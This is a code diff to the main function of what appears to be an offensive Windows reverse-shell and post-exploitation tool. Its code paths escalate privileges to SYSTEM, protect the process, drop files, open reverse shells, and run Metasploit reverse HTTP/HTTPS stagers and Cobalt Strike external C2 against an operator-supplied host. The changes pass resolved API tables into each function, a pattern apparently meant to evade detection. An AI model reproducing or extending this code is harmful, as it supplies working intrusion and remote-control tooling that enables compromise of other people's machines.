@@ -85,11 +85,11 @@ int wmain(int argc, WCHAR* argv[]){
             if (isArgHostSet(APICall.Advapi32Api)) {
                 printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
                 GetSystem(APICall.Kernel32Api, APICall.Advapi32Api);
-            } else if(IsRunAsSystem()){
+            } else if(IsRunAsSystem(APICall.Kernel32Api)){
                 if (GetInfoPipeSystem(&listAgrument)){
                     ProtectProcess();
                     initWSAS();
-                    RunShell(listAgrument);
+                    RunShell(APICall.Kernel32Api, APICall.Advapi32Api,listAgrument);
                 } else{
                     return FALSE;
                 }
@@ -116,11 +116,11 @@ int wmain(int argc, WCHAR* argv[]){
         RunProcessDetached(APICall.Kernel32Api, argc, argv);
     else {
         if (listAgrument.toDROP != Nothing)
-            DropFiles(listAgrument.wincatDefaultDir, listAgrument.toDROP);
+            DropFiles(APICall.Kernel32Api, APICall.CabinetApi, listAgrument.wincatDefaultDir, listAgrument.toDROP);
         if (argc >= 3) {
             if (listAgrument.GetSystem) {
                 ProtectProcess();
-                PrivEsc(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Shell32Api, listAgrument);
+                PrivEsc(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Shell32Api, APICall.CabinetApi, listAgrument);
                 return FALSE;
             } else if (initWSAS()) {
                 switch (listAgrument.payloadType) {
@@ -128,7 +128,7 @@ int wmain(int argc, WCHAR* argv[]){
                 case PAYLOAD_RECV_PS:
                     if (listAgrument.lpszUsername[0] == 0) {
                         ProtectProcess();
-                        RunShell(listAgrument);
+                        RunShell(APICall.Kernel32Api, APICall.Advapi32Api, listAgrument);
                     }else
                         RunShellAs(listAgrument);
                     break;
@@ -138,11 +138,11 @@ int wmain(int argc, WCHAR* argv[]){
                     break;
                 case PAYLOAD_MSF_RECV_HTTP:
                     ProtectProcess();
-                    StagerReverseHTTP(listAgrument.host, listAgrument.port);
+                    StagerReverseHTTP(APICall.Kernel32Api, APICall.WininetApi, listAgrument.host, listAgrument.port);
                     break;
                 case PAYLOAD_MSF_RECV_HTTPS:
                     ProtectProcess();
-                    StagerReverseHTTPS(listAgrument.host, listAgrument.port);
+                    StagerReverseHTTPS(APICall.Kernel32Api, APICall.WininetApi, listAgrument.host, listAgrument.port);
                     break;
                 case PAYLOAD_CS_EXTERNAL_C2:
                     ProtectProcess();
